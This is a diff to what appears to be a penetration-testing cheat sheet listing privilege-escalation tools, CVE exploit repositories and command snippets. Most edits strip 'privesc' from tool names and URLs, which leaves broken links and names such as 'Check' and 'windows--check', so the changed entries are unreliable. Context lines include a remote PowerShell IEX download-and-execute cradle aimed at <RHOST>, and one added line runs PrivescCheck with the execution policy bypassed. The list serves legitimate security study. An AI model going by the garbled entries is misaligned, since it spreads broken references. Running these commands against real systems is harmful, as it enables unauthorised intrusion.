@@ -126,7 +126,7 @@
 		- [powercat](#powercat)
 		- [Powermad](#powermad)
 		- [PowerShell](#powershell)
-  		- [PrivescCheck](#privesccheck)
+  		- [Check](#check)
 		- [pwncat](#pwncat)
 		- [rpcclient](#rpcclient)
 		- [Rubeus](#rubeus)
@@ -297,12 +297,12 @@
 | PKINITtools | https://github.com/dirkjanm/PKINITtools |
 | powercat | https://github.com/besimorhino/powercat |
 | PowerSharpPack | https://github.com/S3cur3Th1sSh1t/PowerSharpPack |
-| PowerUp | https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 |
+| PowerUp | https://github.com/PowerShellMafia/PowerSploit/blob/master//PowerUp.ps1 |
 | PowerView | https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 |
 | PowerView.py | https://github.com/aniqfakhrul/powerview.py |
 | PPLdump | https://github.com/itm4n/PPLdump |
 | Priv2Admin | https://github.com/gtworek/Priv2Admin |
-| PrivescCheck | https://github.com/itm4n/PrivescCheck |
+| Check | https://github.com/itm4n/Check |
 | PSPKIAudit | https://github.com/GhostPack/PSPKIAudit |
 | pspy | https://github.com/DominicBreuker/pspy |
 | pth-toolkit | https://github.com/byt3bl33d3r/pth-toolkit |
@@ -323,7 +323,7 @@
 | Watson | https://github.com/rasta-mouse/Watson |
 | WESNG | https://github.com/bitsadmin/wesng
 | Whisker | https://github.com/eladshamir/Whisker |
-| Windows-privesc-check | https://github.com/pentestmonkey/windows-privesc-check |
+| Windows--check | https://github.com/pentestmonkey/windows--check |
 | Windows Privilege Escalation Fundamentals | https://www.fuzzysecurity.com/tutorials/16.html |
 | Windows Privilege Escalation | https://github.com/frizb/Windows-Privilege-Escalation |
 | Sharpersist | https://github.com/mandiant/SharPersist |
@@ -416,7 +416,7 @@
 | CVE-2023-21746 | Windows NTLM EoP LocalPotato LPE | https://github.com/decoder-it/LocalPotato |
 | CVE-2023-21768 | Windows Ancillary Function Driver for WinSock LPE POC | https://github.com/chompie1337/Windows_LPE_AFD_CVE-2023-21768 |
 | CVE-2023-21817 | Kerberos Unlock LPE PoC | https://gist.github.com/monoxgas/f615514fb51ebb55a7229f3cf79cf95b |
-| CVE-2023-22809 | sudoedit LPE | https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc |
+| CVE-2023-22809 | sudoedit LPE | https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit- |
 | CVE-2023-23752 | Joomla Unauthenticated Information Disclosure | https://github.com/Acceis/exploit-CVE-2023-23752 |
 | CVE-2023-25690 | Apache mod_proxy HTTP Request Smuggling PoC | https://github.com/dhmosfunk/CVE-2023-25690-POC |
 | CVE-2023-28879 | Shell in the Ghost: Ghostscript RCE PoC | https://github.com/AlmondOffSec/PoCs/tree/master/Ghostscript_rce |
@@ -7831,7 +7831,7 @@ os.system("bash")
 
 ##### Automated Enumeration
 
-unix-privesc-check
+unix--check
 
 ```c
  ./unix-privesc-check > output.txt
@@ -9666,6 +9666,7 @@ Invoke-Command -Computer <RHOST> -ScriptBlock { IEX(New-Object Net.WebClient).do
 ```c
 Set-ExecutionPolicy Bypass -Scope Process -Force
 . .\PrivescCheck.ps1
+powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
 ```
 
 ```c
